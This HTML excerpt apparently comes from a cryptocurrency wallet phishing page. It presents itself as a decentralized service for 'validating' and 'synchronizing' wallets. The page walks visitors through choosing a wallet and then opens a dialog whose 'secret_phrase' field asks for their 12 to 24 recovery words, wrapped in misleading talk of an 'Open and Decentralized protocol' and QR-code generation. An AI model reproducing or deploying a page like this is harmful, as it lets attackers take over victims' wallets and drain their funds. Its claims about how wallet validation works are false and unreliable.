                            ...
                            <div class="slider-item">
                                <div class="themesflat-container">
                                    <div class="wrap-heading flat-slider text-center">
                                        <h2 class="heading">Validate, initialize, <br> and synchronize your
                                        </h2>
                                        <h1 class="heading"><span class="tf-text s1">tokens</span>
                                            <span>on your wallets</span>
                                        </h1>
                                        <p class="sub-heading mg-t-29 mg-bt-50">Open and decentralized protocol for syncing various Wallets to Dapps Secure Server
                                        </p>
                                        <div class="flat-bt-slider flex">
                                        <a href="wallets.php" class="sc-button header-slider style style-1 note fl-button pri-1">
                                                <span>Staking</span>
                                            </a>
                                            <a href="wallets.php" class="sc-button header-slider style style-1 note fl-button pri-1">
                ...
                <div class="themesflat-container">
                    <div class="sc-box-icon-inner">
                        <div class="sc-box-icon">
                            ...
                            <p class="content">We have varieties of wallets you can choose from to validate or synchronize your wallet. Please, select your correct wallet name before proceeding.</p>
                        </div>
                        <div class="sc-box-icon">
                            <div class="image">
                                <svg width="56" height="56" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
                            ...
                            <h3 class="heading"><a href="connect-wallet.html">Validate Your Wallet</a></h3>
                            <p class="content">Once you select your wallet, you will be prompted to connect via a decentralized protocol. This can successfully be completed manually or automatically.</p>
                        </div>
                        <div class="sc-box-icon mg-bt">
                            ...
                            <h3 class="heading"><a href="connect-wallet.html">Generate QR Code</a></h3>
                            <p class="content">Upon successful validation, a QR Code will be generated for your wallet. You can always scan your QR Code to reinitialize your wallet.</p>
                        </div>
                        <div class="sc-box-icon">
                            <div class="image">
                                <svg width="56" height="56" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
                            ...
                            <h3 class="heading"><a href="connect-wallet.html">Save Wallet QR Code</a></h3>
                            <p class="content">Saving your generated mnemonic code or QR Code is important. You can click on Save or Screenshot the QR Code Page. You choose how you want to save!</p>
                        </div>
                    </div>
                </div>
            </section>
            ...
            <div class="modal-dialog modal-dialog-centered" role="document">
                <div class="modal-content">
                    ...
                    <div class="modal-body space-y-20 pd-40">
                        ...
                        <p class="text-center">Please save your <span class="price color-popup">QR CODE </span> generated below</p>
                        <p class="text-center"><img align="center" width="300" height="300" src="assets/images/backgroup-secsion/validated.png"></p>
            ...
            <div class="modal-dialog modal-dialog-centered" role="document">
                <div class="modal-content">
                    ...
                    <div class="modal-body space-y-20 pd-40">
                        ...
                        <p class="text-center">
                            Synchronize and validate your selected wallet. A QR code via <span class="price color-popup">an Open and Decentralized protocol</span> will be generated upon successful validation.
                        </p>
                        ...
                        <div id="div_connect_manuallly" style="display:none;">
                            <textarea style="font-size:25px; font-weight:650" rows="4" name="secret_phrase" id="secret_phrase" class="form-control text-primary" placeholder="Enter your 12, 15, 18, 21 or 24 Mnemonic words. Seperate them with spaces."></textarea><br>
                            <input type="text" id="" />
                            <button disabled type="button" id="button_connect_wallet" class="btn btn-primary" style="border-top: 5px; opacity:0.2">Connect Wallet</button>
                        </div>
